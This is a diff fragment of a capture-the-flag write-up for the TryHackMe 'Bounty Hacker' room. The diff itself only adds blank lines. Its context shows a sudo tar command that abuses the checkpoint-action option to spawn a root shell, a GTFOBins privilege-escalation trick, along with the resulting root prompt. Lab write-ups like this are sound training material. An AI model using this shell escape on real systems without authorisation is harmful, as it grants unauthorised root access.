@@ -86,6 +86,7 @@ There is a privesc with it on gtfobins so it's an easy win <br>
 
 <br>
 Let's run it :<br>
+
 ```lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading `/' from member names
 # /bin/bash
@@ -96,5 +97,6 @@ total 4
 -rw-r--r-- 1 root root 19 Jun  7 17:16 root.txt
 root@bountyhacker:~/Desktop# 
 ```
+
 Here we go ! Very easy room but it's still nice to do it. <br>
 Thanks [Sevuhl](https://tryhackme.com/p/Sevuhl) !
